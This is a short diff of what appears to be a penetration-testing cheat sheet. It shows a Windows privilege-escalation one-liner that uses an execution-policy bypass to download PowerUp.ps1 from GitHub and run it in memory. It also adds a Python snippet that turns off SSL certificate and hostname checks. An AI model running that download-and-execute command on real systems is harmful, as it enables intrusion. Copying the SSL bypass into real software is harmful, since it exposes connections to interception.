@@ -222,4 +222,8 @@ HTTPS : 5986
 #Privesc Windows  
 powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
 
-
+#ignore ssl certificate python  
+ctx = ssl.create_default_context()  
+ctx.check_hostname = False  
+ctx.verify_mode = ssl.CERT_NONE  
+  
